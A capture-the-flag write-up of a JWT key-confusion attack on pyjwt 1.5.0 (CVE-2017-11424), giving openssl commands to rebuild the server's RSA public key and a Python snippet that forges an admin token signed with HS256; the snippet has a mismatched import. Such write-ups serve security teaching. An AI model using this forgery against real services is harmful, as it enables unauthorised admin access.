A JWT key confusion attack on pyjwt 1.5.0 (CVE-2017-11424) that allow attacker to use public key on RS256-JWT validation by re-encoding the system's public key and specify it as HS256-JWT

Summary:
No matter how user registered an account, admin flag will always set as false. The objective is to change it to admin true and get the flag. Upon login, user receive a jwt token located at cookie.

Attack idea:
1. Register and login as user 2 times, collect 2 different JWT tokens
2. Use 2 jwt tokens to generate the public key used for signing the jwt.
3. Using the public key, sign another cookie that specify admin=true and algorithm=HS256
4. JWT key confusion vulnerability on the system will accept the forged token and allow us to login as admin
5. Flag!

Solution:
1. Obtain 2 JWT tokens with different usernames.
2. Use the solve.py script to find their respective n and e values.
3. Insert n and e values into def.asn1.
4. `openssl asn1parse -genconf def.asn1 -out pubkey.der`
5. `Convert the DER-encoded public key to PEM format: openssl rsa -in pubkey.der -inform der -pubin -out pubkey.pem`
6. `Convert the PEM-encoded public key to RSAPublicKey format: openssl rsa -in pubkey.pem -out rsapublickey.pem -pubin -RSAPublicKey_out`
7. Obtain the RSA public key (rsapublickey.pem).
 
8. With the RSA public key acquired, generate a JWT with admin set to true using Python. Here's how:
9. run this code (pyjwt version must be 1.5.0)
```
import pyjwt
file = open('rsapublickey.pem', 'rb').read()
print(jwt.encode({'public_id': 'a','name': 'yourname','admin':True, 'exp':99999999999}, file, algorithm='HS256'))
```
11. Send the generated token.


reference (this might help): https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/